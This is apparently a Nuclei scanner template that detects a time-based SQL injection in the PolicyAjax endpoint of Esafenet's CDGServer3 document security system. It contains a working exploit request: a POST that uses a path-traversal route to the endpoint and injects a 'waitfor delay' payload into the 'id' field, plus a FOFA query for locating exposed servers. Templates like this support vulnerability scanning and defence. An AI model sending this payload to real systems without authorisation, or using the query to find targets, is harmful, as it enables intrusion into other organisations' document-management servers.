id: esafenet-cdgserver3-PolicyAjax-sqli

info:
  name: 亿赛通电子文档安全管理系统 PolicyAjax - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - 
  metadata:
    verified: true
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: esafenet,sqli,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: no-cache
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Pragma: no-cache
        Upgrade-Insecure-Requests: 1

        command=selectOption&id=-999';waitfor delay '0:0:6'--+&type=JMCL

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(header,'CDGServer3')
          - duration >= 5 && duration < 9
        condition: and